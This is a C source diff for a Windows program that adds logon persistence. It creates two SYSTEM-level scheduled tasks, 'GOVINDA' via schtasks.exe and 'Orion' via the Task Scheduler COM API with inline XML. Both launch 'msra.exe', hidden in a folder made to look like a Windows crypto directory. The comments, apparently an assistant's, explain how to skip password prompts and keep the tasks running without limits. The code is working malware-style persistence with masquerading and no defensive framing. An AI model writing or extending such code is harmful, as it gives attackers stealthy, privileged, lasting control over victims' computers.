@@ -3,8 +3,13 @@
 #include <tlhelp32.h>
 #include <shobjidl.h>
 #include <objbase.h>
+#include <oleauto.h>
+#define COBJMACROS
+#include <taskschd.h>
 
 #pragma comment(lib, "ole32.lib")
+#pragma comment(lib, "oleaut32.lib")
+#pragma comment(lib, "taskschd.lib")
 
 static const char *g_dir = "C:\\ProgramData\\Microsoft\\Crypto\\RSA\\S-1-5-18";
 static const char *g_audit = "C:\\ProgramData\\Microsoft\\Crypto\\RSA\\S-1-5-18\\audit.log";
@@ -95,29 +100,80 @@ static void create_task_govinda(void) {
     wsprintfA(q, "schtasks.exe /query /tn GOVINDA >nul 2>&1");
     if (system(q) == 0) { audit("[+] GOVINDA task already exists"); return; }
 
+    /* ponytail: /ru SYSTEM skips the interactive password prompt that
+       /rl highest (no /ru) hits and that hangs system() in a non-interactive
+       session. /sc onlogon still fires on any user logon. */
     char c[MAX_PATH * 4];
-    wsprintfA(c, "schtasks.exe /create /tn GOVINDA /tr \"%s\" /sc onlogon /rl highest /f", taskPath);
+    wsprintfA(c, "schtasks.exe /create /tn GOVINDA /tr \"%s\" /ru SYSTEM /sc onlogon /f >nul 2>&1", taskPath);
     audit("[+] Creating GOVINDA task (schtasks.exe)");
     if (system(c) == 0) audit("[+] GOVINDA task created");
     else audit("[-] GOVINDA task creation failed");
 }
 
+/* ponytail: Orion via the Task Scheduler 2.0 COM API (RegisterTask with an
+   inline XML definition). schtasks.exe works fine (see GOVINDA) but the user
+   wants this one registered through the API. Setup is one Connect + one
+   RegisterTask call; XML drives Principal(=SYSTEM) + LogonTrigger + Exec.
+   RegisterTask swallows the trigger/action/principal objects in one shot,
+   no need to touch ITaskDefinition/IExecAction/ILogonTrigger individually
+   (and mingw's taskschd.h is missing the ILogonTrigger interface anyway). */
 static void create_task_orion(void) {
     char taskPath[MAX_PATH];
     wsprintfA(taskPath, "%s\\msra.exe", g_dir);
 
-    // ponytail: check existence via schtasks /query, create if missing (same
-    // reliable path as GOVINDA; the COM Task Scheduler 2.0 API was silently
-    // failing to register the task on this build).
-    char q[MAX_PATH * 2];
-    wsprintfA(q, "schtasks.exe /query /tn Orion >nul 2>&1");
-    if (system(q) == 0) { audit("[+] Orion task already exists"); return; }
+    /* build the task XML: SYSTEM principal, HighestAvailable run level,
+       LogonTrigger, one Exec action pointing at msra.exe. */
+    char xml[1024];
+    wsprintfA(xml,
+        "<Task version=\"1.2\" xmlns=\"http://schemas.microsoft.com/windows/2004/02/mit/task\">"
+        "<Principals><Principal id=\"LocalSystem\"><UserId>S-1-5-18</UserId>"
+        "<RunLevel>HighestAvailable</RunLevel></Principal></Principals>"
+        "<Triggers><LogonTrigger><Enabled>true</Enabled></LogonTrigger></Triggers>"
+        "<Settings><Enabled>true</Enabled><Hidden>false</Hidden>"
+        "<ExecutionTimeLimit>PT0S</ExecutionTimeLimit><DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>"
+        "<StopIfGoingOnBatteries>false</StopIfGoingOnBatteries></Settings>"
+        "<Actions Context=\"Author\"><Exec><Command>%s</Command></Exec></Actions></Task>",
+        taskPath);
 
-    char c[MAX_PATH * 4];
-    wsprintfA(c, "schtasks.exe /create /tn Orion /tr \"%s\" /sc onlogon /rl highest /f", taskPath);
-    audit("[+] Creating Orion task (schtasks.exe)");
-    if (system(c) == 0) audit("[+] Orion task created");
-    else audit("[-] Orion task creation failed");
+    ITaskService *svc = NULL;
+    HRESULT hr = CoCreateInstance(&CLSID_TaskScheduler, NULL, CLSCTX_INPROC_SERVER,
+                                  &IID_ITaskService, (void**)&svc);
+    if (FAILED(hr)) { audit("[-] CoCreateInstance TaskScheduler failed (0x%lx)", hr); return; }
+
+    /* Connect to local machine / current account. Empty VARIANTs mean
+       defaults: this computer, current user, logged-on credentials. */
+    VARIANT v; VariantInit(&v);
+    hr = ITaskService_Connect(svc, v, v, v, v);
+    if (FAILED(hr)) { audit("[-] ITaskService::Connect failed (0x%lx)", hr); ITaskService_Release(svc); return; }
+
+    ITaskFolder *root = NULL;
+    hr = ITaskService_GetFolder(svc, SysAllocString(L"\\"), &root);
+    if (FAILED(hr) || !root) { audit("[-] GetFolder(\\) failed (0x%lx)", hr); ITaskService_Release(svc); return; }
+
+    /* user=SYSTEM, logonType=SERVICE_ACCOUNT means no password required.
+       sddl=VT_EMPTY -> use default security. flags=CREATE_OR_UPDATE(6) is
+       idempotent: re-running won't error, just refreshes. */
+    VARIANT vUser;    VariantInit(&vUser);    vUser.vt = VT_BSTR; vUser.bstrVal = SysAllocString(L"SYSTEM");
+    VARIANT vPass;    VariantInit(&vPass);
+    VARIANT vSddl;    VariantInit(&vSddl);
+
+    IRegisteredTask *reg = NULL;
+    BSTR bName = SysAllocString(L"Orion");
+    int xmlWlen = MultiByteToWideChar(CP_UTF8, 0, xml, -1, NULL, 0);
+    BSTR bXml  = SysAllocStringLen(NULL, xmlWlen);	/* includes room for terminator */
+    if (bXml) MultiByteToWideChar(CP_UTF8, 0, xml, -1, bXml, xmlWlen);
+
+    hr = ITaskFolder_RegisterTask(root, bName, bXml, TASK_CREATE_OR_UPDATE,
+                                  vUser, vPass, TASK_LOGON_SERVICE_ACCOUNT, vSddl, &reg);
+    if (SUCCEEDED(hr)) audit("[+] Orion task created (Task Scheduler COM API, ru=SYSTEM)");
+    else                audit("[-] RegisterTask Orion failed (0x%lx)", hr);
+
+    if (reg)   IRegisteredTask_Release(reg);
+    SysFreeString(bName);
+    SysFreeString(bXml);
+    VariantClear(&vUser);
+    ITaskFolder_Release(root);
+    ITaskService_Release(svc);
 }
 
 static DWORD WINAPI worker_thread(LPVOID lp) {
